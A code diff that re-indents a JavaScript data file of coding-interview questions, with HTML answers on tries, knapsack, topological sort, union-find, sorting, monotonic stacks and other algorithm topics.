-          a: `<p>A <strong>Trie</strong> is a tree-like data structure for storing strings where each node represents a character. It's extremely fast for prefix-based lookups.</p>
+      },
+      {
+        q: 'What is a Trie (Prefix Tree) and when is it used?',
+        difficulty: 'hard',
+        a: `<p>A <strong>Trie</strong> is a tree-like data structure for storing strings where each node represents a character. It's extremely fast for prefix-based lookups.</p>
 <p><strong>Analogy:</strong> A dictionary organized letter by letter. To find "cat", go to 'c', then 'a', then 't'. To find all words starting with "ca", follow 'c' → 'a' and you immediately see all options.</p>
 <pre>Trie storing ["cat", "car", "card", "dog"]:
 
@@ -3085,11 +3086,11 @@ class Trie {
 <li><strong>Word games</strong>: Boggle, Scrabble word validation</li>
 </ul>
 <div class="key-point">Trie search is <strong>O(L)</strong> where L is length of the word — independent of how many words are stored! Much faster than HashSet for prefix queries.</div>`,
-        },
-        {
-          q: 'What is the Knapsack Problem?',
-          difficulty: 'hard',
-          a: `<p>The <strong>Knapsack Problem</strong>: Given items with weights and values, select items to maximize total value without exceeding a weight limit.</p>
+      },
+      {
+        q: 'What is the Knapsack Problem?',
+        difficulty: 'hard',
+        a: `<p>The <strong>Knapsack Problem</strong>: Given items with weights and values, select items to maximize total value without exceeding a weight limit.</p>
 <p><strong>Analogy:</strong> You're packing for a hike with a backpack that holds 10kg. You have a tent (3kg, value 5), sleeping bag (4kg, value 7), food (5kg, value 8), camera (2kg, value 4). What do you take to maximize usefulness?</p>
 <p><strong>0/1 Knapsack (can't split items):</strong></p>
 <pre>Items: [{weight:3, value:5}, {weight:4, value:7}, 
@@ -3124,11 +3125,11 @@ int knapsack(int[] weights, int[] values, int capacity) {
     return dp[n][capacity];
 }</pre>
 <div class="key-point">0/1 Knapsack is a classic <strong>DP problem</strong>: O(n × capacity). Variations: Unbounded Knapsack (unlimited copies), Fractional Knapsack (can split items — use Greedy).</div>`,
-        },
-        {
-          q: 'What is Topological Sort?',
-          difficulty: 'hard',
-          a: `<p><strong>Topological Sort</strong> orders nodes in a <strong>directed acyclic graph (DAG)</strong> such that for every edge A→B, A comes before B.</p>
+      },
+      {
+        q: 'What is Topological Sort?',
+        difficulty: 'hard',
+        a: `<p><strong>Topological Sort</strong> orders nodes in a <strong>directed acyclic graph (DAG)</strong> such that for every edge A→B, A comes before B.</p>
 <p><strong>Analogy:</strong> Getting dressed. You must put on underwear before pants, socks before shoes. There's a dependency order. Topological sort gives you a valid order to get dressed.</p>
 <pre>Dependencies:
   underwear → pants → belt
@@ -3171,11 +3172,11 @@ List&lt;Integer&gt; topologicalSort(int n, List&lt;List&lt;Integer&gt;&gt; adj) 
 <li>Package dependency resolution (npm, Maven)</li>
 </ul>
 <div class="key-point">Topological sort only works on <strong>DAGs</strong> (directed graphs with no cycles). If there's a cycle, no valid ordering exists. Kahn's algorithm detects cycles: if result size < n, there's a cycle.</div>`,
-        },
-        {
-          q: 'What is the Union-Find (Disjoint Set) data structure?',
-          difficulty: 'hard',
-          a: `<p><strong>Union-Find</strong> tracks a collection of elements partitioned into disjoint (non-overlapping) sets. It supports two operations efficiently: <strong>Find</strong> (which set does this element belong to?) and <strong>Union</strong> (merge two sets).</p>
+      },
+      {
+        q: 'What is the Union-Find (Disjoint Set) data structure?',
+        difficulty: 'hard',
+        a: `<p><strong>Union-Find</strong> tracks a collection of elements partitioned into disjoint (non-overlapping) sets. It supports two operations efficiently: <strong>Find</strong> (which set does this element belong to?) and <strong>Union</strong> (merge two sets).</p>
 <p><strong>Analogy:</strong> Social groups at a party. Each group has a leader. When two groups decide to merge, one leader becomes the new leader. To check if two people are in the same group, check if they have the same leader.</p>
 <pre>Initially: Each person is their own group
   {A} {B} {C} {D} {E}
@@ -3221,11 +3222,11 @@ class UnionFind {
 <li>Network connectivity</li>
 </ul>
 <div class="key-point">With path compression + union by rank, both Find and Union are nearly <strong>O(1)</strong> — technically O(α(n)) which is ≤ 4 for any practical input size.</div>`,
-        },
-        {
-          q: "How do you solve the 'Two Sum' problem?",
-          difficulty: 'easy',
-          a: `<p><strong>Problem:</strong> Given an array and a target, find two numbers that add up to the target. Return their indices.</p>
+      },
+      {
+        q: "How do you solve the 'Two Sum' problem?",
+        difficulty: 'easy',
+        a: `<p><strong>Problem:</strong> Given an array and a target, find two numbers that add up to the target. Return their indices.</p>
 <p><strong>Analogy:</strong> You have a jar of numbered balls. You pick one ball and ask: "Is there another ball that, together, adds up to the target?" Instead of checking every pair (slow), you remember what you've already seen.</p>
 <pre>Array: [2, 7, 11, 15], Target: 9
 
@@ -3260,11 +3261,11 @@ while (left < right) {
     else right--;
 }</pre>
 <div class="key-point">"Two Sum" is the <strong>#1 most asked interview question</strong> (LeetCode #1). The HashMap approach trades space for time: O(n) time, O(n) space. It's a pattern: when you need to find a complement, use a HashMap.</div>`,
-        },
-        {
-          q: 'What is Bit Manipulation and common bitwise tricks?',
-          difficulty: 'medium',
-          a: `<p><strong>Bit Manipulation</strong> = working directly with binary representations of numbers. Extremely fast and memory-efficient.</p>
+      },
+      {
+        q: 'What is Bit Manipulation and common bitwise tricks?',
+        difficulty: 'medium',
+        a: `<p><strong>Bit Manipulation</strong> = working directly with binary representations of numbers. Extremely fast and memory-efficient.</p>
 <p><strong>Analogy:</strong> Normal math uses decimal (base 10). Computers think in binary (base 10 → base 2). Bit manipulation is "speaking the computer's native language".</p>
 <pre>Basic operators:
   AND (&):  1010 & 1100 = 1000  (both bits must be 1)
@@ -3302,11 +3303,11 @@ int hammingWeight(int n) {
     return count;
 }</pre>
 <div class="key-point">XOR is the most useful bit operator in interviews. Key properties: <code>x ^ x = 0</code>, <code>x ^ 0 = x</code>. This solves "find the single number" in O(n) time, O(1) space.</div>`,
-        },
-        {
-          q: 'What is Memoization vs Tabulation in Dynamic Programming?',
-          difficulty: 'medium',
-          a: `<p>Both are strategies for DP. They store computed results to avoid redundant work.</p>
+      },
+      {
+        q: 'What is Memoization vs Tabulation in Dynamic Programming?',
+        difficulty: 'medium',
+        a: `<p>Both are strategies for DP. They store computed results to avoid redundant work.</p>
 <p><strong>Memoization (Top-Down):</strong> Start from the big problem, recursively break it down, and <strong>cache</strong> results as you go.</p>
 <p><strong>Tabulation (Bottom-Up):</strong> Start from the smallest sub-problems, iteratively build up to the answer using a <strong>table</strong>.</p>
 <p><strong>Analogy — Building a staircase to floor 10:</strong></p>
@@ -3340,11 +3341,11 @@ int climb(int n) {
 <tr><td>Computes</td><td>Only needed subproblems</td><td>All subproblems</td></tr>
 <tr><td>Stack overflow?</td><td>Possible (deep recursion)</td><td>No</td></tr></table>
 <div class="key-point">Memoization is usually <strong>easier to write</strong> (just add cache to recursion). Tabulation is <strong>more efficient</strong> (no recursion overhead) and avoids stack overflow. In interviews, start with memoization, then optimize to tabulation if asked.</div>`,
-        },
-        {
-          q: 'How does Counting Sort / Radix Sort work? When are they faster than O(n log n)?',
-          difficulty: 'hard',
-          a: `<p><strong>Counting Sort</strong> and <strong>Radix Sort</strong> are non-comparison sorts that can beat the O(n log n) barrier by using the structure of the data itself.</p>
+      },
+      {
+        q: 'How does Counting Sort / Radix Sort work? When are they faster than O(n log n)?',
+        difficulty: 'hard',
+        a: `<p><strong>Counting Sort</strong> and <strong>Radix Sort</strong> are non-comparison sorts that can beat the O(n log n) barrier by using the structure of the data itself.</p>
 <p><strong>Counting Sort — O(n + k)</strong> where k is the range of values:</p>
 <p><strong>Analogy:</strong> You have 100 exam scores from 0-100. Instead of comparing scores, just count how many students got each score and rebuild the sorted list.</p>
 <pre>Input: [4, 2, 2, 8, 3, 3, 1]
@@ -3369,11 +3370,11 @@ Sort by 100s digit:[2, 24, 45, 66, 75, 90, 170, 802] ✅</pre>
 <tr><td>Counting Sort</td><td>O(n + k)</td><td>Small range of integers (e.g., ages 0-150)</td></tr>
 <tr><td>Radix Sort</td><td>O(d(n+k))</td><td>Fixed-length integers or strings</td></tr></table>
 <div class="key-point">These sorts are <strong>faster than Quick/Merge Sort</strong> when the data range is limited. Counting Sort is used inside Radix Sort as a subroutine. Not suitable for arbitrary floating-point numbers.</div>`,
-        },
-        {
-          q: 'What is a Monotonic Stack and when do you use it?',
-          difficulty: 'hard',
-          a: `<p>A <strong>Monotonic Stack</strong> is a stack that maintains elements in a strictly increasing or decreasing order. Elements are popped when the ordering would be violated.</p>
+      },
+      {
+        q: 'What is a Monotonic Stack and when do you use it?',
+        difficulty: 'hard',
+        a: `<p>A <strong>Monotonic Stack</strong> is a stack that maintains elements in a strictly increasing or decreasing order. Elements are popped when the ordering would be violated.</p>
 <p><strong>Analogy:</strong> A line of people sorted by height. When a tall person arrives, everyone shorter in front of them steps out of line. The line stays in order.</p>
 <p><strong>Classic problem: Next Greater Element</strong></p>
 <pre>Input: [2, 1, 2, 4, 3]
@@ -3409,11 +3410,11 @@ int[] nextGreater(int[] nums) {
 }</pre>
 <p><strong>Use cases:</strong> Next greater/smaller element, largest rectangle in histogram, stock span problem, trapping rain water.</p>
 <div class="key-point">Monotonic stack solves "next greater/smaller element" problems in <strong>O(n)</strong> instead of O(n²). Each element is pushed and popped at most once.</div>`,
-        },
-        {
-          q: 'What is Binary Search on Answer?',
-          difficulty: 'medium',
-          a: `<p><strong>Binary Search on Answer</strong> = instead of searching for an element in an array, you binary search over the <strong>range of possible answers</strong> to find the optimal one.</p>
+      },
+      {
+        q: 'What is Binary Search on Answer?',
+        difficulty: 'medium',
+        a: `<p><strong>Binary Search on Answer</strong> = instead of searching for an element in an array, you binary search over the <strong>range of possible answers</strong> to find the optimal one.</p>
 <p><strong>Analogy:</strong> "What's the minimum speed to deliver all packages within 8 hours?" Speed could be 1-1000. Instead of trying each, binary search: "Is speed 500 enough? Yes → try 250. No → try 750."</p>
 <p><strong>Example: Koko Eating Bananas</strong></p>
 <pre>Problem: Koko has piles of bananas [3, 6, 7, 11]. 
@@ -3445,11 +3446,11 @@ boolean canFinish(int[] piles, int h, int speed) {
 }</pre>
 <p><strong>Pattern recognition:</strong> If the problem asks "find minimum/maximum X such that condition Y is satisfied" and the condition is <strong>monotonic</strong> (once true, stays true), use binary search on answer.</p>
 <div class="key-point">This pattern appears in: splitting array, capacity to ship packages, magnetic force between balls, minimized maximum. Always ask: "Can I binary search the answer?"</div>`,
-        },
-        {
-          q: 'What is the difference between a Set, Map, and List?',
-          difficulty: 'easy',
-          a: `<p>Three fundamental collection types in programming:</p>
+      },
+      {
+        q: 'What is the difference between a Set, Map, and List?',
+        difficulty: 'easy',
+        a: `<p>Three fundamental collection types in programming:</p>
 <p><strong>Analogy:</strong></p>
 <ul>
 <li><strong>List</strong> = Shopping list: ordered, can have duplicates ("buy milk, eggs, milk").</li>
@@ -3474,8 +3475,7 @@ set.add("apple"); set.add("apple"); // {apple} (only one!)
 Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();
 map.put("apple", 5); map.get("apple"); // 5</pre>
 <div class="key-point">*Use <code>LinkedHashSet</code>/<code>LinkedHashMap</code> for insertion order, <code>TreeSet</code>/<code>TreeMap</code> for sorted order. In interviews, choose the right collection: need uniqueness? Set. Need key-value? Map. Need ordering? List.</div>`,
-        },
-      ],
-    },
-  );
-})();
+      },
+    ],
+  },
+];
